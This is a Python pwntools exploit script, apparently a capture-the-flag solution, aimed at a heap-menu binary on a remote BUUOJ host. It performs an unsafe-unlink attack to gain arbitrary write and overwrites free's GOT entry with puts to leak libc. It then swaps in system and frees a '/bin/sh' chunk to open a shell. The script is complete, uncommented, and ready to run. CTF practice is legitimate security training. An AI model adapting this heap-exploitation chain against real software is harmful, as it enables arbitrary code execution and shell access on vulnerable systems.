from pwn import *

io=remote('node3.buuoj.cn',26974)
libc=ELF('./libc-2.23.so')

def add(size):
    io.sendline('1')
    io.sendline(str(size))
    io.recvuntil('OK')

def edit(idx,size,data):
    io.sendline('2')
    io.sendline(str(idx))
    io.sendline(str(size))
    io.send(data)
    io.recvuntil('OK')

def free(idx):
    io.sendline('3')
    io.sendline(str(idx))


ptr=0x602150
puts_plt=0x400760
free_got=0x602018
puts_got=0x602020

add(0x80)#1
add(0x80)#2
add(0x80)#3
add(0x80)#4

pl=p64(0)+p64(0x81)+p64(ptr-0x18)+p64(ptr-0x10)+'a'*0x60+p64(0x80)+p64(0x90)
edit(2,len(pl),pl)
free(3)
edit(2,0x18,p64(0)*2+p64(free_got))
edit(1,0x8,p64(puts_plt))
edit(2,0x18,p64(0)*2+p64(puts_got))
free(1)
io.recvuntil("OK\n")
libc_base=u64(io.recv(6).ljust(8,'\x00'))-0x06f690
print(hex(libc_base))
sys=libc_base+libc.sym['system']

edit(2,0x18,p64(0)*2+p64(free_got))
edit(1,0x8,p64(sys))
edit(4,8,'/bin/sh\x00')
free(4)

io.interactive()